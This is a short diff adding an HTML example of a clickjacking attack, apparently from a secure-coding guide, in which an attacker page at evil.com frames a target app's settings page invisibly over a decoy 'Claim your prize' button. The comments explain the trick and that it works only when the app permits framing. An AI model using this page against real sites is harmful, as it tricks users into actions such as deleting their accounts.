@@ -1,0 +1,18 @@
+<!-- ❌ evil.com iframes YOUR app, makes it invisible, and floats a decoy button
+     under the user's cursor. The user thinks they're clicking "Claim prize"
+     but actually click a dangerous control INSIDE your (transparent) iframe. -->
+<style>
+  iframe {
+    position: absolute; top: 0; left: 0;
+    width: 400px; height: 300px;
+    opacity: 0.001;            /* invisible but still clickable */
+    z-index: 2;
+  }
+  .decoy { position: absolute; top: 120px; left: 150px; z-index: 1; }
+</style>
+
+<button class="decoy">Claim your prize 🎁</button>
+<iframe src="https://your-app.com/settings"></iframe>
+
+<!-- The real click lands on whatever sits at that spot inside your-app.com
+     (e.g. "Delete account"). This ONLY works if your app allows itself to be framed. -->
